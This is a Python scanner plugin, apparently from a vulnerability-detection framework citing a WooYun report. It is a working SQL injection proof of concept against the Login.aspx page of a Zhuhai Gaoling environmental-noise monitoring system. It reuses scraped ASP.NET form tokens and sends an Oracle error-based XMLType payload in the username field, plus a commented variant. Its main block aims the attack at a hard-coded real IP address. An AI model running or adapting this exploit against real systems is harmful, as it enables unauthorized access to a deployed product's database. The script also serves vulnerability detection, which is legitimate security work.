#!/usr/bin/env python
#-*- coding: utf-8 -*-
#ref:http://www.wooyun.org/bugs/wooyun-2015-0142695
import re
import urllib

def assign(service, arg):
    if service == "zhuhaigaoling_huanjingzaosheng":
        return True, arg

def audit(arg):
    preWork = arg + 'Portal/Login.aspx'
    code, head, res, errcode, _ = curl.curl(preWork)
    if code != 200:
        return
    patten = re.findall(r'value=\"(?P<aa>[\w\+\/\=]{1,}?)\"',res)
    p1 = urllib.quote(patten[0])
    p2 = urllib.quote(patten[1])
    raw = '''
POST /Portal/Login.aspx HTTP/1.1
Host: 127.0.0.1
Proxy-Connection: keep-alive
Content-Length: 407
Cache-Control: max-age=0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36
Content-Type: application/x-www-form-urlencoded

__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE='''+p1+'''&__EVENTVALIDATION='''+p2+'''&username=admin' AND 8270=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(116)||CHR(101)||CHR(115)||CHR(116)||CHR(118)||CHR(117)||CHR(108))) FROM DUAL) AND 'aaa'='aaa&password=admin&btnSubmit=
    '''
    #payload = '''__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE='''+p1+'''&__EVENTVALIDATION='''+p2+'''&username=admin' AND 8270=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(98)||CHR(117)||CHR(103)||CHR(115)||CHR(99)||CHR(97) ||CHR(110))) FROM DUAL) AND 'aaa'='aaa&password=admin&btnSubmit='''
    #print '-d "'+payload+'" '+preWork
    code, head, res, errcode, _ = curl.curl2(preWork,raw=raw)
    if code==200 and "testvul" in res:
        security_hole(preWork)

if __name__ == '__main__':
    from dummy import *
    audit(assign('zhuhaigaoling_huanjingzaosheng', 'http://110.19.109.58:8888/')[1])